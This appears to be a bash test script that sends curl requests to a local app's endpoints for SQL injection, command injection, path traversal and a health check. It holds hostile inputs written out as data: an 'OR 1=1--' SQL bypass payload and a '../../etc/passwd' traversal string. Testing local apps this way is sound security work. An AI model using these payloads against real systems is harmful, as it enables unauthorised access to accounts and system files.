#!/bin/bash

# Testing SQL Injection
sql_query="query=SELECT+*+FROM+users+WHERE+username+=+'admin'+OR+1=1--"
echo "Testing SQL Injection"
curl -s "http://localhost:3000/api/sqlinjection?$sql_query"
echo -e "\n"

# Testing Command Injection
command="cmd=ls"
echo "Testing Command Injection"
curl -s "http://localhost:3000/api/commandinjection?$command"
echo -e "\n"

# Testing Path Traversal
path="path=../../etc/passwd"
echo "Testing Path Traversal"
curl -s "http://localhost:3000/api/pathtraversal?$path"
echo -e "\n"

# Testing Health Check
echo "Testing Health Check"
curl -s "http://localhost:3000/api/health"
echo -e "\n"

